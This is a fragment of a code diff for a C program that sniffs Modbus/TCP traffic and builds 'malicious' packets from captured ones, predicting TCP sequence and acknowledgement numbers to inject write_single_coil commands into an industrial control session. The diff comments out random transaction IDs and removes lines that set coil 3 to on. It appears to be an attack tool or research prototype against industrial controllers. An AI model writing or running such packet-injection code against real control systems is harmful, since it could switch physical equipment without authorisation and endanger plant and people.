@@ -31,11 +31,11 @@ int main(int argc, char **argv){
   sniffInterface = openInt(error_message, OUT_INTERFACE);
 
   // find packet and parse all its info
-  // TODO can send every nth (slow it down)
   while (1){
     mPacket = findModbusPacket();
 
     // generate malicious packet (predict seq, ack nums) from existing
+    // todo maybe it will be necessary to change transaction ID 
     generateMaliciousPacket(mPacket);
 
     int packet_size = ETH_HEADER_SIZE + IP_HEADER_SIZE + TCP_HEADER_SIZE + \
@@ -79,15 +79,9 @@ void generateMaliciousPacket(modbusPacket *mPacket){
   // ack = ack + 48 == 4 write_single_coil packets
   // seq = seq + 48 == 4 write_single_coil packets
 
+  // TODO maybe 
   // transaction id has to be unique
-  mPacket->modbusH.transactionId = ntohs(random());
-
-  // ref num 3
-  mPacket->modbusP.data[0] = 0;
-  mPacket->modbusP.data[1] = 3;
-
-  // activate data
-  mPacket->modbusP.data[2] = 0xff;
+  // mPacket->modbusH.transactionId = ntohs(random());
 
   mPacket->ipHeader.id = random();
   countIpChecksum(mPacket);
